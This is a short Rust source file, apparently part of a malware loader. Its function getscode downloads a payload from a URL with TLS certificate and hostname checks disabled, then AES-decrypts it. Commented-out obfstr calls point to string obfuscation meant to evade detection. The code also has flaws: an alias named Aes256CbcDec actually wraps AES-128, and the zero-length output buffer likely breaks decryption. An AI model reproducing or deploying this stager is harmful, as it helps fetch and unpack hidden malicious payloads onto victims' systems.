use bytes::Bytes;
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
type Aes256CbcDec = cbc::Decryptor<aes::Aes128>;

fn decrypt(data: &[u8], size: usize, aeskey: &str, aesiv: &str) -> Vec<u8> {
    let mut key = [0x42; 16];
    let mut iv = [0x24; 16];
    //for (i, b) in obfstr::obfstr!(key).as_bytes().iter().enumerate() {
    for (i, b) in aeskey.as_bytes().iter().enumerate() {
        key[i] = *b;
    }
    //for (i, b) in obfstr::obfstr!(aesiv).as_bytes().iter().enumerate() {
    for (i, b) in aesiv.as_bytes().iter().enumerate() {
        iv[i] = *b;
    }
    let mut buf: Vec<u8> = Vec::with_capacity(size);
    let _pt = Aes256CbcDec::new(&key.into(), &iv.into())
        .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buf)
        .unwrap();
    return buf;
}

pub fn getscode(url: &str, encrypted_payload: bool, aeskey: &str, aesiv: &str) -> Bytes {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let res = match client.get(url).send() {
        Ok(res) => res,
        Err(_) => panic!("")
    };
    let rbytes = match res.bytes() {
        Ok(b) => b,
        Err(_) => panic!("")
    };
    // note, skip the first 16 bytes since they are the IV, might want to remove the IV from being in code and 
    // add it to the decypt function
    if encrypted_payload {
        let pt = decrypt(&rbytes[16..], rbytes.len(), aeskey, aesiv);
        let ptb = Bytes::from(pt);
        return ptb;
    } 
    return rbytes;
}